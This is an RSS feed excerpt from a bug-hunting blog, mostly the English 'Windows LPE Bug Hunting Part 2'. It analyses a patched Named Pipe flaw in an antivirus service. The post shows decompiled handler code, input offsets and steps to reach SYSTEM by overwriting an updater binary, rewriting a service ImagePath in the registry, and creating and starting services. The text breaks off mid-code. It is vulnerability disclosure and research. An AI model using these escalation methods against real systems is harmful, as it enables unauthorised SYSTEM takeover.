&#xACBD;&#xB85C;&#xB85C; &#xB418;&#xC5B4; &#xC788;&#xB294; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xC81C; StartServiceW() &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xC2E4;&#xD589;&#xB9CC; &#xC2DC;&#xD0A8;&#xB2E4;&#xBA74;? System &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC545;&#xC131; &#xC11C;&#xBE44;&#xC2A4;&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xACA0;&#xC8E0;!!</p><h2 id="&#xB9C8;&#xCE58;&#xBA70;"><a href="#&#xB9C8;&#xCE58;&#xBA70;" class="headerlink" title="&#xB9C8;&#xCE58;&#xBA70;"></a>&#xB9C8;&#xCE58;&#xBA70;</h2><hr><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/KR/image34.png" alt></p><p>&#xC774;&#xBC88; Part 2&#xC758; Named Pipe &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xC5EC;&#xB7EC; LPE &#xBCA1;&#xD130;&#xC5D0; &#xB300;&#xD55C; &#xC124;&#xBA85;&#xC774; &#xC5EC;&#xB7EC;&#xBD84;&#xC5D0;&#xAC8C; &#xB3C4;&#xC6C0;&#xC774; &#xB418;&#xC168;&#xC73C;&#xBA74; &#xC88B;&#xACA0;&#xB294;&#xB370;&#xC694;!! Named Pipe&#xC758; &#xAD8C;&#xD55C; &#xC124;&#xC815;&#xC73C;&#xB85C; &#xC778;&#xD574; medium &#xC720;&#xC800;&#xAC00; System &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xD589;&#xC704;&#xB97C; &#xD560; &#xC218; &#xC788;&#xB294; &#xC0C1;&#xD669;&#xB3C4; &#xC788;&#xB2E4;&#xB294; &#xC810;! &#xC4F0;&#xB2E4; &#xBCF4;&#xB2C8; &#xB108;&#xBB34; &#xACE0;&#xBD09;&#xBC25;&#xCC98;&#xB7FC; &#xC4F4; &#xAC83; &#xAC19;&#xC544; &#xBD84;&#xB7C9; &#xC870;&#xC808;&#xC5D0; &#xC2E4;&#x2026;&#xD328; &#xD55C; &#xAC83; &#xAC19;&#xC9C0;&#xB9CC;!! &#xADF8;&#xB798;&#xB3C4; &#xC774;&#xB7F0; &#xBC29;&#xC2DD;&#xC73C;&#xB85C;&#xB3C4; LPE&#xAC00; &#xAC00;&#xB2A5;&#xD558;&#xAD6C;&#xB098;!! &#xD558;&#xBA74;&#xC11C; &#xBD10;&#xC8FC;&#xC2DC;&#xBA74; &#xAC10;&#xC0AC;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4; &#x1F609; &#xB2E4;&#xC74C;&#xC5D0;&#xB294; Windows LPE&#xC758; &#xAF43;&#xC774;&#xC790; Kernel Driver&#xC5D0;&#xC11C; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; &#xB3CC;&#xC544;&#xC624;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;~ &#xAC10;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;!</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://learn.microsoft.com/ko-kr/windows/win32/api/winsvc/nf-winsvc-openscmanagerw">https://learn.microsoft.com/ko-kr/windows/win32/api/winsvc/nf-winsvc-openscmanagerw</a></li><li><a href="https://learn.microsoft.com/ko-kr/windows/win32/services/service-security-and-access-rights">https://learn.microsoft.com/ko-kr/windows/win32/services/service-security-and-access-rights</a></li><li><a href="https://learn.microsoft.com/ko-kr/windows/win32/api/winsvc/nf-winsvc-createservicew">https://learn.microsoft.com/ko-kr/windows/win32/api/winsvc/nf-winsvc-createservicew</a></li><li><a href="https://learn.microsoft.com/ko-kr/windows/win32/api/winsvc/nf-winsvc-startservicew">https://learn.microsoft.com/ko-kr/windows/win32/api/winsvc/nf-winsvc-startservicew</a></li><li><a href="https://learn.microsoft.com/ko-kr/windows/win32/api/shlwapi/nf-shlwapi-shsetvaluew">https://learn.microsoft.com/ko-kr/windows/win32/api/shlwapi/nf-shlwapi-shsetvaluew</a></li><li><a href="https://learn.microsoft.com/ko-kr/windows/win32/api/winbase/nf-winbase-copyfilew">https://learn.microsoft.com/ko-kr/windows/win32/api/winbase/nf-winbase-copyfilew</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/LPE/">LPE</category>
      
      <category domain="https://hackyboiz.github.io/tags/Windows/">Windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/BugHunting/">BugHunting</category>
      
      <category domain="https://hackyboiz.github.io/tags/KernelDriver/">KernelDriver</category>
      
      <category domain="https://hackyboiz.github.io/tags/NamedPipe/">NamedPipe</category>
      
      
      <comments>https://hackyboiz.github.io/2026/01/18/gongjae/WHS3-bughunting2/KR/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Windows LPE Bug Hunting, Served by the Team’s Youngest: Part 2 (EN)</title>
      <link>https://hackyboiz.github.io/2026/01/18/gongjae/WHS3-bughunting2/EN/</link>
      <guid>https://hackyboiz.github.io/2026/01/18/gongjae/WHS3-bughunting2/EN/</guid>
      <pubDate>Sun, 18 Jan 2026 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&lt;img src=&quot;/2026/01/18/gongjae/WHS3-bughunting2/EN/logo_window.png&quot; alt&gt;&lt;/p&gt;
&lt;h2 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerli</description>
        
      
      
      
      <content:encoded><![CDATA[<p><img src="/2026/01/18/gongjae/WHS3-bughunting2/EN/logo_window.png" alt></p><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><hr><p>Happy New Year, everyone! This is my second research write-up, and I&#x2019;m gongjae, taking charge of Part 2 for the &#x201C;maknaes&#x201D; &#x1F600;</p><p>banda already did an awesome job on <a href="https://hackyboiz.github.io/2025/12/28/banda/WHS3-bughunting/en/">Part 1</a>, so I wondered if there would be anything left for me to explain&#x2026; but I still wanted to share the vulnerabilities I personally discovered and hopefully provide a little help to those who are interested in bug hunting. &#x1F604;</p><p>In this post, we&#x2019;ll look at several LPE vectors that can arise from Named Pipes, and show that &#x201C;wow, vulnerabilities can happen in <em>this</em> way too!&#x201D;</p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><hr><p>The vulnerability I found is a Named Pipe issue in an antivirus product. It has already been patched, and I reported it to ZDI&#x2014;so a CVE has been assigned as well.</p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/EN/image1.png" alt></p><p>The cases I&#x2019;ll show today can be categorized into <strong>File-related</strong>, <strong>Registry-related</strong>, and <strong>Service-related</strong> behaviors. Let&#x2019;s see what happens when an IPC interface is exposed through an overly permissive Named Pipe&#x2014;case by case.</p><h2 id="0-Attack-Surface"><a href="#0-Attack-Surface" class="headerlink" title="0. Attack Surface"></a>0. Attack Surface</h2><hr><p>Before we get into the individual vulnerabilities, this is the first thing we must check. If <strong>Everyone</strong> has access, that&#x2019;s often the very first step toward reaching <strong>SYSTEM</strong>. It&#x2019;s very similar to Part 1&#x2014;but <del>it would be a shame not to show it</del> let&#x2019;s go through it together anyway.</p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/EN/image2.png" alt></p><p>When you install the target program and check Process Explorer, you can see that there is a process called SASCore64.exe running with SYSTEM privileges! And you can also confirm that there is a Named Pipe in the Handles section.</p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/EN/image3.png" alt></p><p>And then, the biggest gatekeeper is the ACL part..!! I checked the permissions using SysinternalsSuite&#x2019;s accesschk and confirmed that Everyone has RW permission~ Therefore, it means that a medium user can access a process running with SYSTEM privileges without any special permissions, right!</p><p>So now, let&#x2019;s extract the SASCore64.exe binary, open it with IDA, and then check if there are Named Pipe-related APIs in Imports.</p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/EN/image4.png" alt></p><p>Let&#x2019;s go to the sub_140013F60 function that has the CreateNamedPipe API.</p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/EN/image5.png" alt></p><p>If you look at the code, you can see that it creates a named pipe through CreateNamedPipeA and connects. The key here is that it configures SECURITY_ATTRIBUTES for the Named Pipe, and all local users can have full access! Let&#x2019;s go to the StartAddress function.</p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/EN/image6.png" alt></p><p>If you look at the code, you can see that it creates a named pipe through CreateNamedPipeA and connects. The key here is that it configures SECURITY_ATTRIBUTES for the Named Pipe, and all local users can have full access! Let&#x2019;s go to the StartAddress function.</p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/EN/image7.png" alt></p><p>We can put our input value into v6, and it is divided into cases so we can use various functions! However, in order to use the functions, you must first obtain a Token through the 0x103A branch below.</p><pre><code class="hljs cpp"><span class="hljs-keyword">case</span> <span class="hljs-number">0x103A</span>:{  <span class="hljs-comment">// ... (input/time validation and other auxiliary logic)</span>  <span class="hljs-keyword">if</span> (ImpersonateNamedPipeClient(a3))  {    <span class="hljs-comment">// ... (store registry context in TLS, etc.)</span>    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *(DWORD *)(input + <span class="hljs-number">8</span>));    <span class="hljs-keyword">if</span> (hProc)    {      HANDLE hToken = <span class="hljs-literal">NULL</span>;      <span class="hljs-keyword">if</span> (OpenProcessToken(hProc, TOKEN_ALL_ACCESS, &amp;hToken) &amp;&amp; hToken)      {        <span class="hljs-comment">// ... (store the token into the internal session/table)</span>        CloseHandle(hToken);      }      CloseHandle(hProc);    }    RevertToSelf();    FileSize = <span class="hljs-number">1</span>; <span class="hljs-comment">// session established</span>  }  <span class="hljs-comment">// ... (build response)</span>  WriteFile(a3, Buffer, <span class="hljs-number">0x10018</span>u, &amp;written, <span class="hljs-number">0</span>);  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;}</code></pre><ul><li>If ImpersonateNamedPipeClient and OpenProcessToken(&#x2026;Pid&#x2026;) succeed, a new <strong>node + token</strong> is stored in the internal list (a1 + 0x68).</li><li>Since the token value is returned at offset 0x04 among the 0x10018-byte response, you can store this Token and use it.</li></ul><p>After obtaining a token in this way, you can use other functions, and these functions are the vulnerability vectors I will talk about.</p><h2 id="1-LPE-using-File-related-APIs"><a href="#1-LPE-using-File-related-APIs" class="headerlink" title="1. LPE using File-related APIs"></a>1. LPE using File-related APIs</h2><hr><p>First, shall we look at File-related APIs? Windows has various APIs, and most of them verify them so that they can be used safely. The important part is that the user should not be able to touch them.. But what if the user can manipulate important arguments?</p><h3 id="1-1-CopyFileW"><a href="#1-1-CopyFileW" class="headerlink" title="1-1. CopyFileW()"></a>1-1. CopyFileW()</h3><p>If you look at MS&#x2019;s <code>CopyFileW()</code> function, you can see that it copies an existing file to a new file.</p><pre><code class="hljs cpp"><span class="hljs-function">BOOL <span class="hljs-title">CopyFileW</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  [in] LPCWSTR lpExistingFileName,</span></span><span class="hljs-function"><span class="hljs-params">  [in] LPCWSTR lpNewFileName,</span></span><span class="hljs-function"><span class="hljs-params">  [in] BOOL    bFailIfExists</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;</code></pre><p>Then, if you can change the file at the desired path into a malicious file with SYSTEM privileges, privilege escalation would happen, right?</p><pre><code class="hljs cpp"><span class="hljs-keyword">case</span> <span class="hljs-number">0x100D</span>:{  <span class="hljs-comment">// ...</span>  BOOL ok = CopyFileW(      (LPCWSTR)(input + <span class="hljs-number">8</span>),       <span class="hljs-comment">// attacker-controlled: src</span>      (LPCWSTR)(input + <span class="hljs-number">0x1048</span>),  <span class="hljs-comment">// attacker-controlled: dst</span>      *(DWORD *)(input + <span class="hljs-number">0x2088</span>)  <span class="hljs-comment">// attacker-controlled: bFailIfExists</span>  );  DWORD err = GetLastError();  <span class="hljs-comment">// ... (put ok/err into the response Buffer and return)</span>  WriteFile(a3, Buffer, <span class="hljs-number">0x10018</span>u, &amp;written, <span class="hljs-number">0</span>);  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;}</code></pre><p>After obtaining the Token, if you branch to case 0x100D, you can put the file path to copy into input+8, and the file path to overwrite into input+0x1048, and call the API!</p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/EN/image8.png" alt></p><p>Why is this LPE..? There are files that we cannot change or delete with normal privileges, right. And if there is a file that runs every few seconds? If you change this file into a malicious file that can run cmd with SYSTEM privileges, then literally a SYSTEM-privileged cmd will open every few seconds!! That&#x2019;s the principle.&#x1F47D;</p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/EN/image9.png" alt></p><p>Shall we verify this directly with Process Monitor? This is the Chrome updater process, it runs every few seconds, and its privilege is high so it&#x2019;s impossible to access with normal privileges. But if you change it into a malicious file using the vulnerability above!?</p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/EN/image10.png" alt></p><p>You can confirm that a SYSTEM cmd opens like this! &#x1F44F;</p><p>Shall we confirm a bit more clearly through dynamic analysis?</p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/EN/imag11.png" alt></p><p>After attaching to the process with WinDbg, get the base address with the lm command, and then set the base in IDA and set a bp near the CopyFileW() function to check.</p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/EN/image12.png" alt></p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/EN/image13.png" alt></p><p>As follows, Dst contains the updater path mentioned earlier.</p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/EN/image14.png" alt></p><p>And you can see that the source contains the file path to be copied as-is. This fake <code>updater.exe</code> is a malicious file that launches <code>cmd</code> with a SYSTEM token, and once it is copied, the LPE is successfully achieved.</p><h2 id="2-LPE-using-Registry-related-APIs"><a href="#2-LPE-using-Registry-related-APIs" class="headerlink" title="2. LPE using Registry-related APIs"></a>2. LPE using Registry-related APIs</h2><hr><p>Now, shall we look at Registry-related APIs!</p><h3 id="2-1-SHSetValueW"><a href="#2-1-SHSetValueW" class="headerlink" title="2-1. SHSetValueW()"></a>2-1. SHSetValueW()</h3><pre><code class="hljs cpp"><span class="hljs-function">LSTATUS <span class="hljs-title">SHSetValueW</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  [in]           HKEY    hkey,</span></span><span class="hljs-function"><span class="hljs-params">  [in, optional] LPCWSTR pszSubKey,</span></span><span class="hljs-function"><span class="hljs-params">  [in, optional] LPCWSTR pszValue,</span></span><span class="hljs-function"><span class="hljs-params">  [in]           DWORD   dwType,</span></span><span class="hljs-function"><span class="hljs-params">  [in, optional] LPCVOID pvData,</span></span><span class="hljs-function"><span class="hljs-params">  [in]           DWORD   cbData</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;</code></pre><p>The <code>SHSetValueW()</code> function sets the value of a registry key. If you look at the argument setup, you can set SubKey and ValueName. What this means is, if you can manipulate these arguments, you can arbitrarily change the Value of the registry at the desired path!! Let&#x2019;s confirm through the code directly.</p><pre><code class="hljs cpp"><span class="hljs-keyword">case</span> <span class="hljs-number">0x102C</span>:{  <span class="hljs-keyword">const</span> WCHAR *SubKey    = (<span class="hljs-keyword">const</span> WCHAR *)(input + <span class="hljs-number">16</span>);    <span class="hljs-comment">// attacker-controlled</span>  <span class="hljs-keyword">const</span> WCHAR *ValueName = (<span class="hljs-keyword">const</span> WCHAR *)(input + <span class="hljs-number">4176</span>);  <span class="hljs-comment">// attacker-controlled</span>  HKEY RootKey           = *(HKEY *)(input + <span class="hljs-number">8</span>);           <span class="hljs-comment">// attacker-controlled</span>  DWORD Type             = *(DWORD *)(input + <span class="hljs-number">0xA094</span>);     <span class="hljs-comment">// attacker-controlled</span>  LPCVOID Data           = (LPCVOID)(input + <span class="hljs-number">0x2090</span>);      <span class="hljs-comment">// attacker-controlled</span>  DWORD DataSize         = *(DWORD *)(input + <span class="hljs-number">0xA090</span>);     <span class="hljs-comment">// attacker-controlled</span>  <span class="hljs-comment">// ... (HKCR wrapping / HKCU TLS substitution / table handle logic, etc.)</span>  LSTATUS st = SHSetValueW(      RootKey,      SubKey,      ValueName,      Type,      Data,      DataSize  );  DWORD err = GetLastError();  <span class="hljs-comment">// ... (put st/err into the response Buffer and return)</span>  WriteFile(a3, Buffer, <span class="hljs-number">0x10018</span>u, &amp;written, <span class="hljs-number">0</span>);  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;}</code></pre><p>If you go to case 0x102C, in the end, you can set the desired registry value through the SHSetValueW function.</p><pre><code class="hljs cpp">offset +<span class="hljs-number">0x0008</span> &#x2192; <span class="hljs-function">HKEY <span class="hljs-title">Root</span> <span class="hljs-params">(e.g., HKEY_LOCAL_MACHINE)</span></span>offset +0x0010 &#x2192; SubKeyoffset +<span class="hljs-number">0x1050</span> &#x2192; ValueNameoffset +<span class="hljs-number">0xA068</span> &#x2192; Type (e.g., REG_SZ)offset +<span class="hljs-number">0x2090</span> &#x2192; Buffer (value to <span class="hljs-built_in">set</span>)offset +<span class="hljs-number">0xA064</span> &#x2192; Buffer size</code></pre><p>The input structure is as follows.</p><pre><code class="hljs cpp"><span class="hljs-keyword">if</span> (RootKey == HKEY_CLASSES_ROOT){  <span class="hljs-comment">// wrap into an internal class</span>  CClassesRoot ctx;  ctx.h1 = TlsGetValue(...);  ctx.h2 = TlsGetValue(...);  SHSetValueW(ctx.h1 <span class="hljs-keyword">or</span> h2, SubKey, ValueName, Type, Data, Size);}<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (RootKey &amp; <span class="hljs-number">0x80000000</span>)  <span class="hljs-comment">// e.g., HKEY_LOCAL_MACHINE, HKEY_USERS, etc.</span>{  keyctx = get_handle_from_table(RootKey);  SHSetValueW(keyctx, SubKey, ValueName, Type, Data, Size);}<span class="hljs-keyword">else</span>{  <span class="hljs-comment">// if it&apos;s a normal HKEY_CURRENT_USER, substitute it with a TLS-based key</span>  <span class="hljs-keyword">if</span> (RootKey == HKEY_CURRENT_USER)    RootKey = TlsGetValue(...);  SHSetValueW(RootKey, SubKey, ValueName, Type, Data, Size);}</code></pre><p>The core vulnerable logic is like above; in the end, the arbitrary HKEY + SubKey + Value + Data provided by the user goes into SHSetValueW&#x2019;s arguments &#xADF8;&#xB300;&#xB85C; under SYSTEM privileges.</p><p>Then this time too, shall we find a process that runs with SYSTEM privileges and has ImagePath in the Registry in the same way?</p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/EN/image15.png" alt></p><p>I selected the MicrosoftEdgeElevationService service as the target and proceeded. If you check through Process Monitor, you can confirm that when you turn on Edge, the service is automatically loaded with SYSTEM privileges.</p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/EN/image16.png" alt></p><p>After that, let&#x2019;s check in Services and Registry Editor where this service is executed from.</p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/EN/image17.png" alt></p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/EN/image18.png" alt></p><p>As in the pictures above, you can confirm that it is MicroSoftEdgeElevationService, and you can confirm that ImagePath is <code>&quot;C:\Program Files (x86)\Microsoft\Edge\Application\xxx.xxx.xxx\elevation_service.exe&#x201D;</code>. Now, after triggering the vulnerability, let&#x2019;s check again.</p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/EN/image19.png" alt></p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/EN/image20.png" alt></p><p>You can confirm that the service&#x2019;s Path and the registry&#x2019;s ImagePath have changed like this!! Now, if you run MicrosoftEdge, a cmd with SYSTEM privileges will open!</p><p>We can&#x2019;t skip dynamic analysis this time either, right?</p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/EN/image21.png" alt></p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/EN/image22.png" alt></p><p>If you look at the Value part, you can confirm that ImagePath is included.</p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/EN/image23.png" alt></p><p>If you look at the SubKey part, you can confirm that the registry path mentioned earlier is included.</p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/EN/image24.png" alt></p><p>Finally, you can see that the key contains 0x80000002 meaning HKEY_LOCAL_MACHINE. If you use this function, you can change the high-path registry ImagePath that I want into the value I want!</p><h2 id="3-LPE-using-Service-related-APIs"><a href="#3-LPE-using-Service-related-APIs" class="headerlink" title="3. LPE using Service-related APIs"></a>3. LPE using Service-related APIs</h2><hr><p>Then lastly, shall we look at Service-related APIs! This time, you can achieve LPE using three APIs, so let&#x2019;s look at them one by one.</p><h3 id="3-1-OpenSCManagerW"><a href="#3-1-OpenSCManagerW" class="headerlink" title="3.1 OpenSCManagerW()"></a>3.1 OpenSCManagerW()</h3><pre><code class="hljs cpp"><span class="hljs-function">SC_HANDLE <span class="hljs-title">OpenSCManagerW</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  [in, optional] LPCWSTR lpMachineName,</span></span><span class="hljs-function"><span class="hljs-params">  [in, optional] LPCWSTR lpDatabaseName,</span></span><span class="hljs-function"><span class="hljs-params">  [in]           DWORD   dwDesiredAccess</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;</code></pre><p>First is the <code>OpenSCManagerW()</code> function. The CreateService or StartService that will come later are pretty intuitive about what they do, but this <code>OpenSCManagerW()</code> API must be executed first!</p><p>Because services are objects registered in the &#x201C;SCM database,&#x201D; you need to have a handle (context) to that DB first for subsequent tasks (create/modify/start). You can say this API is the one that opens and returns that handle.</p><pre><code class="hljs cpp"><span class="hljs-keyword">case</span> <span class="hljs-number">0x103B</span>:{  <span class="hljs-keyword">const</span> WCHAR *Machine  = (<span class="hljs-keyword">const</span> WCHAR *)(input + <span class="hljs-number">8</span>);      <span class="hljs-comment">// attacker-controlled (optional)</span>  <span class="hljs-keyword">const</span> WCHAR *Database = (<span class="hljs-keyword">const</span> WCHAR *)(input + <span class="hljs-number">0x1048</span>); <span class="hljs-comment">// attacker-controlled (optional)</span>  DWORD Access          = *(DWORD *)(input + <span class="hljs-number">0x2088</span>);      <span class="hljs-comment">// attacker-controlled</span>  <span class="hljs-comment">// ... (convert empty string to NULL, etc.)</span>  SC_HANDLE hScm = OpenSCManagerW(Machine, Database, Access);  DWORD err = GetLastError();  <span class="hljs-comment">// ... (return hScm/err in the response)</span>  WriteFile(a3, Buffer, <span class="hljs-number">0x10018</span>u, &amp;written, <span class="hljs-number">0</span>);  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;}</code></pre><p>Through case 0x103B branch, you can call the API and obtain the handle:</p><ul><li>input + 8 &#x2192; lpMachineName</li><li>input + 0x1048 &#x2192; lpDatabaseName</li><li>input + 0x2088 &#x2192; dwDesiredAccess</li></ul><p>The important thing here is dwDesiredAccess, it must be set to SC_MANAGER_ALL_ACCESS(0xF003F)!</p><h3 id="3-2-CreateServiceW"><a href="#3-2-CreateServiceW" class="headerlink" title="3.2 CreateServiceW()"></a>3.2 <strong>CreateServiceW()</strong></h3><pre><code class="hljs cpp"><span class="hljs-function">SC_HANDLE <span class="hljs-title">CreateServiceW</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  [in]            SC_HANDLE hSCManager,</span></span><span class="hljs-function"><span class="hljs-params">  [in]            LPCWSTR   lpServiceName,</span></span><span class="hljs-function"><span class="hljs-params">  [in, optional]  LPCWSTR   lpDisplayName,</span></span><span class="hljs-function"><span class="hljs-params">  [in]            DWORD     dwDesiredAccess,</span></span><span class="hljs-function"><span class="hljs-params">  [in]            DWORD     dwServiceType,</span></span><span class="hljs-function"><span class="hljs-params">  [in]            DWORD     dwStartType,</span></span><span class="hljs-function"><span class="hljs-params">  [in]            DWORD     dwErrorControl,</span></span><span class="hljs-function"><span class="hljs-params">  [in, optional]  LPCWSTR   lpBinaryPathName,</span></span><span class="hljs-function"><span class="hljs-params">  [in, optional]  LPCWSTR   lpLoadOrderGroup,</span></span><span class="hljs-function"><span class="hljs-params">  [out, optional] LPDWORD   lpdwTagId,</span></span><span class="hljs-function"><span class="hljs-params">  [in, optional]  LPCWSTR   lpDependencies,</span></span><span class="hljs-function"><span class="hljs-params">  [in, optional]  LPCWSTR   lpServiceStartName,</span></span><span class="hljs-function"><span class="hljs-params">  [in, optional]  LPCWSTR   lpPassword</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;</code></pre><p>Then now that we got the handle, shall we create a Service?</p><pre><code class="hljs cpp"><span class="hljs-keyword">case</span> <span class="hljs-number">0x103F</span>:{  SC_HANDLE hScm = *(SC_HANDLE *)(input + <span class="hljs-number">8</span>);  <span class="hljs-keyword">const</span> WCHAR *SvcName    = (<span class="hljs-keyword">const</span> WCHAR *)(input + <span class="hljs-number">16</span>);     <span class="hljs-comment">// attacker-controlled</span>  <span class="hljs-keyword">const</span> WCHAR *DispName   = (<span class="hljs-keyword">const</span> WCHAR *)(input + <span class="hljs-number">4176</span>);   <span class="hljs-comment">// attacker-controlled</span>  <span class="hljs-keyword">const</span> WCHAR *BinPath    = (<span class="hljs-keyword">const</span> WCHAR *)(input + <span class="hljs-number">8352</span>);   <span class="hljs-comment">// attacker-controlled</span>  DWORD DesiredAccess     = *(DWORD *)(input + <span class="hljs-number">0x2090</span>);      <span class="hljs-comment">// attacker-controlled</span>  DWORD ServiceType       = *(DWORD *)(input + <span class="hljs-number">0x2094</span>);      <span class="hljs-comment">// attacker-controlled</span>  DWORD StartType         = *(DWORD *)(input + <span class="hljs-number">0x2098</span>);      <span class="hljs-comment">// attacker-controlled</span>  DWORD ErrorControl      = *(DWORD *)(input + <span class="hljs-number">0x209C</span>);      <span class="hljs-comment">// attacker-controlled</span>  <span class="hljs-comment">// ... (normalize Group/Deps/StartName/Password pointers and handle NULL)</span>  SC_HANDLE hSvc = CreateServiceW(      hScm,      SvcName,      DispName,      DesiredAccess,      ServiceType,      StartType,      ErrorControl,      BinPath,      <span class="hljs-comment">/* ... */</span> <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>  );  DWORD err = GetLastError();  <span class="hljs-comment">// ... (return hSvc/err in the response)</span>  WriteFile(a3, Buffer, <span class="hljs-number">0x10018</span>u, &amp;written, <span class="hljs-number">0</span>);  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;}</code></pre><p>In case 0x103F branch, you can directly register an arbitrary file as a service via CreateServiceW()!</p><ul><li>input + 0x08 &#x2192; <code>hSCManager</code><ul><li><code>SC_HANDLE</code> (SCM handle obtained from the previous <code>0x103B</code> call)</li></ul></li><li>input + 0x10 &#x2192; <code>lpServiceName</code><ul><li><code>LPCWSTR</code> internal service name (e.g., L&#x201D;LPE&#x201D;)</li></ul></li><li>input + 0x1050 &#x2192; <code>lpDisplayName</code><ul><li><code>LPCWSTR</code> service name shown to the user (e.g., L&#x201D;My Payload Service&#x201D;)</li></ul></li><li>input + 0x2090 &#x2192; <code>dwDesiredAccess</code><ul><li><code>DWORD</code> access right flags (e.g., <code>SERVICE_ALL_ACCESS</code> = 0xF01FF)</li></ul></li><li>input + 0x2094 &#x2192; <code>dwServiceType</code><ul><li><code>DWORD</code> service type (e.g., <code>SERVICE_WIN32_OWN_PROCESS</code> = 0x10)</li></ul></li><li>input + 0x2098 &#x2192; <code>dwStartType</code><ul><li><code>DWORD</code> start type (e.g., <code>SERVICE_DEMAND_START</code> = 0x3)</li></ul></li><li>input + 0x209C &#x2192; <code>dwErrorControl</code><ul><li><code>DWORD</code> error control (e.g., <code>SERVICE_ERROR_NORMAL</code> = 0x1)</li></ul></li><li>input + 0x20A0 &#x2192; <code>lpBinaryPathName</code><ul><li><code>LPCWSTR</code> executable file path (e.g., L&#x201D;C:\Temp\poc.exe&#x201D;)</li></ul></li><li>input + 0x30E0 &#x2192; <code>lpLoadOrderGroup</code><ul><li><code>LPCWSTR</code> load order group (e.g., L&#x201D;Base&#x201D;)</li></ul></li><li>input + 0x4120 &#x2192; <code>lpDependencies</code><ul><li><code>LPCWSTR</code> dependency service list</li></ul></li><li>input + 0x5160 &#x2192; <code>lpServiceStartName</code><ul><li><code>LPCWSTR</code> logon account (e.g., L&#x201D;NT AUTHORITY\System&#x201D;)</li></ul></li><li>input + 0x61A0 &#x2192; <code>lpPassword</code><ul><li><code>LPCWSTR</code> password for that account (NULL if none)</li></ul></li></ul><p>But you can&#x2019;t say it&#x2019;s perfect LPE just by creating it, right? There is also an API that runs it.</p><h3 id="3-3-StartServiceW"><a href="#3-3-StartServiceW" class="headerlink" title="3.3 StartServiceW()"></a>3.3 <strong>StartServiceW()</strong></h3><pre><code class="hljs cpp"><span class="hljs-function">BOOL <span class="hljs-title">StartServiceW</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  [in]           SC_HANDLE hService,</span></span><span class="hljs-function"><span class="hljs-params">  [in]           DWORD     dwNumServiceArgs,</span></span><span class="hljs-function"><span class="hljs-params">  [in, optional] LPCWSTR   *lpServiceArgVectors</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;</code></pre><pre><code class="hljs cpp"><span class="hljs-keyword">case</span> <span class="hljs-number">0x1040</span>:{  SC_HANDLE hSvc = *(SC_HANDLE *)(input + <span class="hljs-number">8</span>);  <span class="hljs-comment">// attacker-controlled (handle from prior call)</span>  BOOL ok = StartServiceW(hSvc, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);  DWORD err = GetLastError();  <span class="hljs-comment">// ... (put ok/err into the response Buffer and return)</span>  WriteFile(a3, Buffer, <span 